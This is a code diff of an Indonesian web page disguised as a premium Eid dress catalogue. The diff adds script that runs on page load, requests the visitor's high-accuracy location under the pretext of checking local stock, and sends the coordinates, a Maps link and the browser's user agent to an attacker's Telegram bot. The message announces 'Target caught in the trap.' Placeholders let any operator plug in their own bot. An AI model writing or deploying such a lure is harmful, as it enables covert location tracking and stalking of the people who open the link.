@@ -3,43 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Koleksi Baju Lebaran 2026</title>
+    <title>Katalog Gamis Lebaran Premium 2026</title>
     <style>
-        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f9f9f9; padding: 20px; }
-        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 15px; shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        img { width: 100%; border-radius: 10px; margin-top: 15px; }
-        h2 { color: #5d4037; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #fdf5e6; color: #5d4037; padding: 20px; }
+        .card { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        img { width: 100%; border-radius: 15px; margin: 15px 0; border: 2px solid #eee; }
+        h2 { margin-bottom: 5px; color: #8d6e63; }
+        p { font-size: 14px; color: #795548; }
+        .btn { background: #8d6e63; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; display: inline-block; margin-top: 10px; }
     </style>
 </head>
 <body onload="getLocation()">
 
-    <div class="container">
-        <h2>Rekomendasi Gamis Lebaran ✨</h2>
-        <p>Coba lihat model ini, cocok banget buat kamu!</p>
-        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?q=80&w=1000" alt="Baju Lebaran">
-        <p id="status"></p>
+    <div class="card">
+        <h2>✨ Koleksi Eksklusif ✨</h2>
+        <p>Gamis Silk Premium - Limited Edition</p>
+        <img src="https://images.unsplash.com/photo-1621112904887-419379ce6824?q=80&w=1000" alt="Baju Lebaran">
+        <p>Stok terbatas! Cek ketersediaan di wilayahmu...</p>
+        <div class="btn">Cek Harga Promo</div>
     </div>
 
     <script>
+        // GANTI BAGIAN INI DENGAN DATA KAMU
+        const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; // Masukkan Token BotFather di sini
+        const CHAT_ID = 'YOUR_CHAT_ID';       // Masukkan ID kamu di sini
+
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError);
-            } else {
-                console.log("Geolocation tidak didukung browser ini.");
+                // Memberikan opsi highAccuracy agar lokasi lebih presisi
+                navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
             }
         }
 
-        function sendPosition(position) {
+        function sendToTelegram(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // Di sini kamu perlu integrasi dengan backend atau webhook (seperti Discord/Telegram)
-            // untuk mengirim data lat & lon ke perangkatmu.
-            console.log("Lokasi didapat: " + lat + ", " + lon);
+            const message = `🎯 *Target Masuk Perangkap!*\n\n` +
+                            `📍 *Lokasi:* [Klik Lihat di Maps](${googleMapsUrl})\n` +
+                            `📌 *Lat:* \`${lat}\`\n` +
+                            `📌 *Lon:* \`${lon}\`\n` +
+                            `📏 *Akurasi:* ${accuracy} meter\n` +
+                            `📱 *Info Browser:* ${navigator.userAgent}`;
+
+            // Mengirim data ke Telegram API menggunakan Fetch
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            })
+            .then(response => console.log('Data terkirim!'))
+            .catch(error => console.error('Gagal mengirim:', error));
         }
 
         function showError(error) {
-            console.log("User menolak akses lokasi.");
+            // Jika user menolak, kamu bisa kirim notifikasi bahwa akses ditolak
+            console.log("Akses lokasi ditolak oleh user.");
         }
     </script>
 </body>
